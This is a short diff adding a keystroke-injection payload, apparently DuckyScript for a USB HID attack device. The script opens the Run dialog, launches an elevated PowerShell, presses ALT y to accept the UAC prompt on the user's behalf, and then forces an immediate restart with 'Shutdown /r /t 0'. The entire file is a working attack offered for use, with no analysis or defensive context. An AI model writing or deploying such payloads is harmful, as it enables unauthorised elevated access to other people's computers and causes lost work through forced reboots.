@@ -1,0 +1,12 @@
+DELAY 1000
+REM Open Run dialog
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+REM Restart the computer
+STRING Shutdown /r /t 0
+ENTER
